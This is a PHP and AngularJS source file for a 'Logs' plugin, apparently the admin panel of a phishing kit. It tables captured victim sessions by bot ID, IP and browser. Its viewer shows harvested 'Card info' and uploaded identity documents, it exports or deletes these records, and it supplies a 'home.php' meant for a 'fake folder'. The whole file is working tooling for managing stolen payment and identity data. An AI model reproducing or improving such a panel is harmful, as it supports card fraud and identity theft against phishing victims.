<?php

//Plugin name:Logs;

if (!defined('UADMIN_AB_ROOT')) {die("You not have permisions");}

if (isset($_GET['jab_cog'])) {
    include 'jab_cog.php';
    exit__();
}
;

if (isset($_GET['bloked'])) {
    include 'bloked_bids.php';
    exit__();
}
;

?>
<script src="bower_components/angular/angular.min.js" charset="utf-8"></script>





 <link rel="stylesheet" href="<?php echo $k_plugin->url_ ?>css/css.css"> 
<div ng-app="app" data-ng-cloak>
    <div class="container my-3" >
        <div class="controllll"  style="">
           


            <div class="btn-group btn-group-sm " >
                <a class="btn btn-outline-info " data-toggle="popover" title="home.php" data-content="home.php file - file to replace inside in fake folder. Just a simple way to assign path to uPanel" href="<?php echo $k_plugin->ajax_url ?>&proxy">  home.php  <span class="fa fa-download"></span></a>
                


                <div class="btn-group btn-group-sm export">
                     <button class="btn btn-outline-info " data-ng-class="{'active':export_dialog==true}"  data-ng-click="export_dialog=!export_dialog"> 
                        <span class="fa fa-file-text " style=""></span>
                        Export &#9663;
                    </button>
                   
                    <!-- <div class="dropdown-menu">
                        <a href="javascript:void(0)" class="dropdown-item"  onclick="pre_selected(export_)" >
                            ... selected
                        </a>

                        <a href="javascript:void(0)" class="dropdown-item disabled">
                            ... all
                        </a>
                        

                        <div class="dropdown-divider"></div>

    
                         <div class="dropdown-submenu">
                             <a href="" class="" data-toggle="dropdown" >test1</a>
                             <div class="dropdown-menu">
                                 <a  class="dropdown-item">resr1</a>
                             </div>
                         </div>
                        

                    </div> -->
        
                </div>





                    



                    <div class="btn-group btn-group-sm" >
                	  <button class="btn btn-outline-info" style="" onclick="pre_selected(show_logs)"> <span class="fa fa-folder-open " style=""></span> Open</button>
                    <button  type="button" class="btn btn-outline-danger dropdown-toggle" data-toggle="dropdown"  >
                        Delete ...
                    </button>
                    <div class="dropdown-menu"  >
                        <a class="dropdown-item text-danger" onclick="pre_selected(remove_logs)" href="javascript:void(0)">... selected</a>
                        <a class="dropdown-item text-danger" onclick="remove_all()" href="javascript:void(0)">... all</a>
                    </div>
                </div>
            </div>
        </div>

<div class="card export mt-2 " data-ng-show="export_dialog==true">
    <div class="card-header">
        Export options
        <a href="javascript:void(0)" data-ng-click="export_dialog=false" class="float-right">&times;</a>
    </div>
    <div class="card-body ">
        <form name="export_form" id="export_form" onsubmit="return false"  autocomplete="off" >

            

            <span>Export</span>
            <select name="what_rows" patern=".{2,}" required class="form-control form-control-sm d-inline-block mx-1" data-ng-model="export.what_rows" id="what_rows" style="width: unset;">
                <option value="">...</option>
                <option value="selected">Selected</option>
                <option value="completed">Completed</option>
                <option value="all">All</option>
            </select>


            <span class="" data-ng-show="export.ids.length>0"> 
                <small>( {{export.ids.length}} items )</small> 
                as 
                <select name="type" patern=".{2,}" required id="type" class="form-control form-control-sm d-inline-block mx-1" data-ng-model="export.type" style="width:unset">
                    <option value="txt" >Text</option>
                    <option value="json">JSON</option>
                </select>

                <span class="" data-ng-show="export.type.length>0">
                     in format as 
                     <select multiple patern=".{2,}" name="columns" required id="columns" class="form-control form-control-sm d-inline-block mx-1" data-ng-model="export.columns" style="width:unset">

<option value="bid">BID</option>
<option value="lc">Time</option>
<option value="link">Link</option>
<option value="ua">User Agent</option>
<option value="ip">IP</option>
<option value="log">Logs</option>
<option value="st">Status</option>
<option value="comm">Comment</option>

                     </select>

({{export.columns.join(' ,')}})

                    <span class="" data-ng-show="export.columns.length>0">
                        <button data-ng-disabled="export_form.$invalid" type="submit" data-ng-click="exp()" class="btn btn-outline-info btn-sm">Export</button>
                    </span>

                </span>

            </span>
        </form>
    </div>
</div>


        <hr>
        <table id="example" class="table table-striped table-bordered" style="width:100%">
            <thead>
                <tr>
                    <th class=""></th>
                    <th>
                        <?php echo __('Last connected') ?>
                    </th>
                    <th>
                        <?php echo __('Link') ?>
                    </th>
                    <th>
                        <?php echo __('BID') ?>
                    </th>
                    <th>
                        <?php echo __('Ip address') ?>
                    </th>
                    <th>
                        <?php echo __('Bowser/OS/Devise') ?>
                    </th>
                    <th>
                        <?php echo __('Data') ?>
                    </th>
                    <th>
                        <?php echo __('Files') ?>
                    </th>
                    <th>
                        <?php echo __('Comments') ?>
                    </th>
                    <th>
                        <?php echo __('Status') ?>
                    </th>
                    <th>
                        <?php echo __('Actions') ?>
                    </th>
                </tr>
            </thead>
            <tfoot>
                <tr>
                    <th class=""></th>
                    <th>
                        <?php echo __('Last connected') ?>
                    </th>
                    <th>
                        <?php echo __('Link') ?>
                    </th>
                    <th>
                        <?php echo __('BID') ?>
                    </th>
                    <th>
                        <?php echo __('Ip address') ?>
                    </th>
                    <th>
                        <?php echo __('Bowser/OS/Devise') ?>
                    </th>
                    <th>
                        <?php echo __('Data') ?>
                    </th>
                    <th>
                        <?php echo __('Files') ?>
                    </th>
                    <th>
                        <?php echo __('Comments') ?>
                    </th>
                    <th>
                        <?php echo __('Status') ?>
                    </th>
                    <th>
                        <?php echo __('Actions') ?>
                    </th>
                </tr>
            </tfoot>
        </table>
    </div>
    <!-- <style type="text/css">
    .log_container td {
        font-size: 0.8em;
    }

    #example {
        font-size: 0.9em
    }
    </style> -->
    <div class="modal  fade" id="log_viwer" logviwer tabindex="-1" role="dialog">
        <div class="modal-dialog modal-lg" role="document">
            <div class="modal-content">
                <div class="modal-header"><b>
                        <?php echo __('Logs'); ?></b>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                    <h4 class="modal-title">{{title}}</h4>
                </div>
                <div class="modal-body">
                    <div log-parser class="log_container" ng-repeat="log in logs"  style="padding-bottom:10px;">
                        <table class=" table table-bordered " style="height:auto;margin-bottom:10px;">
                            <tr>
                                <th>
                                    <?php echo ('Last Conect') ?>
                                </th>
                                <th>
                                    <?php echo ('BID') ?>
                                </th>
                                <th>
                                    <?php echo ('Link') ?>
                                </th>
                                <th>
                                    <?php echo ('Browser') ?>
                                </th>
                                <th>
                                    <?php echo ('Ip') ?>
                                </th>
                            </tr>
                            <tr class="" style="">
                                <td class="middle " style="">
                                    {{log.lc}}
                                </td>
                                <td class=" middle " style="">
                                    {{log.bid}}
                                </td>
                                <td class=" middle " style="">
                                    {{log.link}}
                                </td>
                                <td class=" middle " style="">
                                    {{log.ua | uaparse}}
                                </td>
                                <td class=" middle " style="">
                                    {{log.ip}}
                                </td>
                            </tr>
                        </table>
                        <div class="" style="padding:0 10px">
                            <dl>
                                <dt>
                                    <?php echo __('Logs'); ?></dt>
                                <dd style="white-space:pre-wrap;">{{log.log|no_quotes}}</dd>
                                <!-- ccinfo -->
                                <dt ng-show="card_info">
                                    <?php echo __('Card info'); ?></dt>
                                <dd ng-show="card_info">
                                    <div class="alert alert-info" style="white-space: pre;">{{card_info}}</div>
                                </dd>
                                <!-- ccinfo -->
                                <dt>
                                    <?php echo __('Comment'); ?></dt>
                                <dd>{{log.comm}}</dd>
                                <dt>
                                    <?php echo __('Documents'); ?></dt>
                                <dd>
                                    <div class="row " id="" style="">
                                        <div class="col" data-ng-show="log.files.length==0">
                                            <h6  class="text-warning">
                                                No Documents
                                            </h6>
                                        </div>
                                        <div class="col-sm-3" ng-repeat="img in log.files track by $index" id="" style="">
                                            <div class="card card-body mb-3 mt-3">

                                                <i class="remove5 fa  fa-times-circle-o text-danger  "  data-ng-click="remove_image( $index,img)"  style="position: absolute;right: -10px;top: -10px;cursor: pointer;font-size: 30px"></i>

                                                <a href="{{img}}" target="_blank" ><img ng-src="{{img}}" class="docs_img w-100 " alt=""></a>
                                            </div>
                                        </div>
                                    </div>
                                </dd>
                            </dl>
                        </div>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-default closebutton" data-dismiss="modal">Close</button>
                </div>
            </div><!-- /.modal-content -->
        </div><!-- /.modal-dialog -->
    </div><!-- /.modal -->
    <script type="text/javascript">
    $(document).ready(function() {
        $('#log_viwer').on('show.bs.modal', function() {

            $(this).find('[type="button"]').focus();
        })
    });
    </script>
</div>
<script>
var table_data = <?php echo json_encode($logs) ?>;
</script>

<script src="bower_components/ua-parser-js/dist/ua-parser.min.js" type="text/javascript"></script>



<script src="<?php echo $k_plugin->url_ ?>js/dataTable.js" charset="utf-8"></script>
<script src="<?php echo $k_plugin->url_ ?>js/ng.js" charset="utf-8"></script>
<script>
function export_(els) {
    if (els.length < 1) {
        bootbox.alert('You need to select at least one element');
        return;
    };
    window.location.href = "<?php echo $k_plugin->ajax_url ?>&text&data=" + encodeURIComponent(JSON.stringify(els));
};






///##### new staf 2017 ######################


function edit_comm(ui) {
    bootbox.prompt({
        title: "Comment",
        value: dataTable.row('#' + ui + '').data().comm,
        callback: function(res) {

            if (res != null) {
                $('.loader__').show()
                $.ajax({
                    url: "<?php echo $k_plugin->ajax_url ?>&comm=" + res + "&ui=" + ui,
                    dataType: "json",
                    success: function(data) {
                        $('.loader__').hide()
                        notify(data.mes);
                        var th = dataTable.row('#' + ui + '').data();
                        th.comm = res;
                        dataTable.row('#' + ui + '').data(th).draw('page');
                    },
                    error: function(data) {
                        $('.loader__').hide()
                        notify(data.responseText)
                    }
                })
            }
        }
    })
}



function remove_all() {
    var sels = $(dataTable.rows().data()).map(function() { return this.ui }).get();
    if (sels.length != 0) {
        remove_logs(sels);
    }
}



var pre_selected = function(fun) {
    var sels = $(dataTable.rows({ selected: true }).data()).map(function() { return this.ui });
    if (sels.length != 0) {
        sels = sels.get();
        fun(sels);
    }
}

var remove_log_lock = false

function remove_logs(els) {


    if (remove_log_lock) { return };

    remove_log_lock = true

    bootbox.confirm('Are you sure you want to delete this item(s)',
        function(res) {
            if (res) {
                remove_log_lock = false
                $('.loader__').show()
                $.ajax({
                    url: "<?php echo $k_plugin->ajax_url ?>&del",
                    dataType: "text",
                    data: { data: JSON.stringify(els) },
                    success: function(data) {
                        $('.loader__').hide()
                        els = $(els).map(function() {
                            return "#" + this + "";
                        })
                        dataTable.rows(els).remove().draw('page');
                        notify(data);
                        
                    }
                })
            } else {
                remove_log_lock = false
            }
        })
}

function show_logs(els) {

    logs = []; //erase;

    els = $(els).map(function() {
        return "#" + this + "";
    })

    els = dataTable.rows(els).data();
    logs_cope.$apply(function() {
        logs_cope.logs = els;

    })
    $('#log_viwer').modal();


}


///##### new staf 2017 ######################
</script>

</html>